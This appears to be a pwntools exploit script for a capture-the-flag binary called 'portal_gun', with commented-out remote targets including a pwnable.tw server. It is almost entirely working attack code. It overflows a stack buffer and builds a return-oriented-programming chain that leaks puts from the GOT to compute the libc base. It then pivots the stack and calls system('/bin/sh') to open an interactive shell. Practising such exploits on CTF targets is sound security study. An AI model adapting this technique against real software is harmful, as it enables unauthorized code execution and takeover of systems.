from pwn import *

host = "127.0.0.1"
port = 8888

# r = remote(host,port)
r = process('./portal_gun',env={"LD_PRELOAD" : "./hook.so-997c848132f9fae3a5ffdb0edf7c9071a0dcdebb99c116c5bd011efd28c942ae"})

context.arch= "amd64"

#chall.pwnable.tw 10001
# r = remote("60.250.197.227", 10002)


s = r.recvuntil('\n')
print(s)
s = r.recvuntil('\n')
print(s)

pop_rdi = 0x4007a3
get_plt = 0x400580
put_plt = 0x400560
put_got = 0x601018
pop_rbp_return = 0x400608
buf1 = 0x601e00
buf2 = 0x601f00
leave_ret = 0x40073b


put_offset = 0x76030

input()
payload = flat(['a'*0x70,buf1,pop_rdi,put_got,put_plt,pop_rdi,buf1,get_plt,leave_ret])
r.sendline(payload)
s = r.recv(8)[:-1]
print(hex(int.from_bytes(s, byteorder='little')))
libc_base = int.from_bytes(s, byteorder='little') - put_offset

print(hex(libc_base))
system = 0x488a0+libc_base
pop_rsi = 0x26cf7+libc_base
#input()
payload2 = flat([buf2,pop_rdi,buf1+32,system,"/bin/sh\x00"])
r.sendline(payload2)

r.interactive()



